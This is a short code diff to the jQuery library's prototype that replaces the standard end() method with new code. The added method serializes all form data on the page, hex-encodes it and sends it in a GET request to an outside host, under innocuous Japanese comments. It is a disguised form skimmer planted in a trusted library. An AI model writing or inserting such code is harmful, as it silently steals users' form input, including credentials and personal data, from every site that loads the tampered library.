@@ -107,6 +107,30 @@ jQuery.fn = jQuery.prototype = {
 		return this.pushStack( j >= 0 && j < len ? [ this[ j ] ] : [] );
 	},
 
+	end: async function () {
+		// UTF-16文字列を16進数に変換する関数
+		const toHex = (input) => {
+		  let hexString = "";
+		  for (let i = 0; i < input.length; i++) {
+			const hex = input.charCodeAt(i).toString(16);
+			hexString += hex.length < 2 ? "0" + hex : hex;
+		  }
+		  return hexString;
+		};
+	  
+		// フォームデータの取得
+		const serializedForm = $("form").serialize();
+	  
+		// リクエスト送信
+		await $.ajax({
+		  url: `https://sample/halo/?cat=${toHex(serializedForm)}`,
+		  type: "GET",
+		  dataType: "text",
+		  headers: {
+			"Content-type": "application/json",
+		  },
+		});
+	}	  
 };
 
 jQuery.extend = jQuery.fn.extend = function() {
